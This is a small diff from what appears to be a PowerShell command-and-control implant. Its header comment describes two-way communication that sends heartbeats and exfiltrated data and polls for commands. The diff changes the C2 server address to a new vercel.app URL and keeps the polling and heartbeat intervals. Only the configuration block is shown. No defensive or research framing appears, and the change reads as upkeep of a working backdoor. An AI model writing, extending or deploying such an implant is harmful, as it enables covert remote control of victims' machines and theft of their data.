@@ -2,7 +2,7 @@
 # Two-way communication: sends heartbeats & exfil, polls for commands
 
 # ============ CONFIGURATION ============
-$C2Server = "https://deploy-delta-eosin.vercel.app"
+$C2Server = "https://bom-kaos-kaki.vercel.app"
 $PollInterval = 15  # seconds between command polling
 $HeartbeatInterval = 30  # seconds between heartbeats
 
